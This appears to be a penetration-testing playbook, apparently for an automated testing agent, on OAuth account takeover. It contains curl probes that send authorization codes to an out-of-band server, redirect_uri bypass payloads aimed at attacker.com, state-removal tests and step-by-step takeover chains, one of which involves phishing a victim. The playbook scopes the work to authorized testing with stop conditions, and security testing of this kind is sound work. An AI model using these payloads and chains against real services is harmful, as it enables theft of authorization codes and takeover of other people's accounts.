# OAuth Account Takeover — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Critical | **Prerequisite:** [[oauth]] SKILL.md read — this is the ATO-focused extension. OAuth/social-login flow mapped in Phase 2, test account(s) available

---

## Mental Model

OAuth ATO is the art of turning the *social login flow itself* into a key to someone else's account. The exchange — authorization code, redirect, state, token — is a chain of trust, and every link is attacker-influencable. Break one link and you don't just bypass auth: you *become* the victim.

**The core assumption you're violating:** "The OAuth round-trip is a black box owned by the IdP, so the application must be safe." In practice the application owns the redirect_uri registration, the state validation, the code exchange, the account linking, and the session creation — five separate decisions, each a possible ATO.

**The 5 ATO primitives (learn to spot all five):**
1. **Redirect URI mismatch** — auth code delivered to attacker's domain → token theft → full ATO
2. **Missing/weak state** — OAuth CSRF / login CSRF → attacker's social account silently linked to victim's app account
3. **Account linking on email** — attacker registers attacker@mail.com at the IdP, then links to a victim email string → victim's next login binds attacker session
4. **Token leakage** — code/token leaks via Referer, logs, open redirect on callback
5. **Code/token replay + PKCE optionality** — stolen code replayed without verifier, or code not bound to client

**The ATO chain you're always building toward:** attacker-controlled value (redirect, state, account, or token) → flows through a victim action → attacker ends up with the victim's session.

---

## Phase 1: OOB-First Detection (MANDATORY)

Your OOB server *is* the attacker's redirect/callback endpoint — the single most valuable test infrastructure in this skill.

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.1 OOB as the redirect_uri (code theft probe)
```bash
# Replace registered callback with your OOB URL
curl -i "https://target.com/oauth/authorize?client_id=APP_ID&response_type=code&redirect_uri=http://$OOB_URL/cb&scope=openid"
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 60
```

Callback containing `?code=...` → the authorization server delivered a live code to a URI it never registered. CONFIRMED ATO primitive — skip to Phase 4.

### 1.2 OOB as exfiltration sink
If the callback page has an open redirect or loads external resources, check whether the code/token travels to OOB via the Referer header after a real login.

---

## Phase 2: Confirmation

> Base technique detail lives in [[oauth]] and `skills/oauth/attacks.md`. This phase is the ATO-specific test battery in priority order.

### 2.1 Redirect URI Progressive Bypass (P1 — highest value)

Test in this order; any hit = code-theft ATO:

```
1. Exact registered:  https://app.com/callback              (baseline)
2. Path append:       https://app.com/callback/../attacker
3. Param append:      https://app.com/callback?next=https://attacker.com
4. Fragment:          https://app.com/callback#@attacker.com
5. Subdomain:         https://attacker.app.com/callback
6. Sibling path:      https://app.com/user-content/callback
7. Parsing confusion: https://app.com@attacker.com/callback
                      https://app.com%2f%2fattacker.com
                      https://app.com.cb.attacker.com
8. Scheme downgrade:  http://app.com/callback
9. Localhost:         https://app.com/callback@127.0.0.1
                      http://localhost/callback
10. Full replace:     http://$OOB_URL/cb
```

**Critical detail:** always *complete the flow* and watch where the code lands — some servers accept the URI but the application validates again at exchange time. Confirm the code actually reaches your destination.

### 2.2 State Parameter (P2 — login CSRF / account linking)

```bash
# Remove state entirely
curl -i "https://target.com/oauth/authorize?client_id=APP_ID&response_type=code&redirect_uri=https://app.com/callback&scope=openid"
# Reuse a previously issued state
# Send a static/predictable state
```

If the flow completes without state (or with a reused state) → **login CSRF**: attacker starts the flow with their own external account, victim clicks and completes it, attacker's social account binds to victim's app account → ATO.

### 2.3 Account Linking Logic (P3)

Two distinct tests:

**Email-based linking:**
1. Attacker creates social account with `victim@target.com` (IdP lets them) — or uses IdP account where email is unverified
2. Attacker completes social login into a *new* app account
3. Check if the app auto-links by email string → attacker now controls any future session on that email

**Identity-attribute takeover (pre-ATO):**
- If the app stores social profile fields (email, phone, name) without re-verification on change, check whether changing the linked email to a victim's email lets the attacker claim the victim's account at next password reset.

### 2.4 Token Leakage Paths (P4)

- After a real OAuth login, load the callback page and inspect network requests for a `Referer` that carries `?code=`
- Test if the callback accepts a token in *query* instead of *fragment* (response_mode confusion): `response_type=token&response_mode=query`
- Check for any open redirect on the callback domain that forwards the query string → [[open-redirect]] chain

### 2.5 Replay & Client Binding (P5)

```bash
# 1. Get a code, exchange it -> success
# 2. Exchange the SAME code again -> must FAIL (single-use check)
# 3. Replay a code captured from another flow instance
# 4. PKCE optionality: start flow WITHOUT code_challenge, then exchange
#    a stolen code without a verifier -> code not bound to PKCE
# 5. Client confusion: exchange App A's code at App B's client_id
```

### 2.6 Implicit / Hybrid Flow Checks

If `response_type=token` or `token id_token` is accepted:
- Token in URL fragment → leaks via browser history, Referer, proxy logs
- Test if the application silently upgrades to implicit on a crafted request

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare OAuth ATO negative without:**

1. Testing all 10 redirect_uri variants (2.1) — not just the obvious replacement
2. Confirming **code delivery location** — if the server accepts a manipulated URI but the app rejects the code at exchange, it's not an ATO (check the exchange response)
3. Completing a full flow for each variant (browser automation if needed) — half-finished flows hide the verdict
4. Testing state: removed, reused, static — and checking the application *validates* it, not just that it exists
5. Checking account linking rules (email string, unverified email, re-verification on change)
6. Confirming PKCE is actually enforced — presence of the parameter means nothing if the server accepts its absence
7. Verifying the code is single-use and client-bound

If every variant is rejected at the right layer and state is enforced → NEGATIVE.

---

## Phase 4: Exploitation (ATO PoC Chains)

**Entry requirement:** HIGH confidence on at least one primitive. Build the full ATO chain, then stop.

### Chain A — Code Theft ATO
```
1. Attacker registers redirect_uri pointing at attacker.com (or uses a bypass variant)
2. Victim clicks crafted authorize URL (phishing/social)
3. Authorization code delivered to attacker server (OOB captured it)
4. Attacker exchanges code -> victim's access token -> victim's session
5. Document: OOB log with ?code= + successful exchange
```

### Chain B — Login CSRF Account Linking
```
1. Attacker initiates OAuth with their own Google/GitHub account (state absent)
2. Victim clicks the login URL (or attacker embeds it) and completes consent
3. Attacker's social account is now linked to the victim's app account
4. Attacker logs in via social -> victim's account
5. Document: state absent in request + account-linking result
```

### Chain C — Email Collision ATO
```
1. Attacker registers at the IdP using the victim's email (unverified)
2. Attacker social-logs into the app; app auto-links by email string
3. Attacker gets victim's account (or a session that controls it)
4. Document: pre-existing victim account + new social login result
```

**Stop condition:** First confirmed unauthorized session/access. Capture evidence (request/response, OOB log, cookie/session proof), then STOP. Do not pivot into the victim's private data beyond proof-of-control.

---

## What You DO
- Complete every flow end-to-end — the verdict is in where the code lands and whether the exchange succeeds
- Use OOB as your redirect_uri — fastest code-theft confirmation in existence
- Test redirect bypass progressively (path → param → subdomain → parsing confusion → full replace)
- Check state *validation*, not state *presence*
- Test account-linking rules with a disposable social account
- Verify PKCE enforceability and single-use codes — presence ≠ enforcement

## What You DO NOT Do
- Declare negative because the "obvious" redirect replacement failed — the other 9 variants matter
- Test redirect manipulation without watching where the code actually lands
- Assume PKCE/state presence means security — always test removal
- Log into real victim accounts — use your own test accounts and report the *proof chain*
- Skip the account-linking tests — email-collision ATO is frequently the easiest win
- Confuse "authorization server accepted URI" with "application exchanged the code" — check the exchange

---

## Cross-Skill Links
- [[oauth]] — Base skill; this file extends it with ATO-specific batteries
- [[jwt]] — Stolen access/id_tokens are often JWTs; verify signature handling
- [[open-redirect]] — Open redirects on the callback domain amplify redirect_uri bypass and Referer leakage
- [[csrf]] — OAuth state IS the CSRF token; missing state = login CSRF
- [[session-management]] — Check how the OAuth-issued session is established and whether it can be hijacked
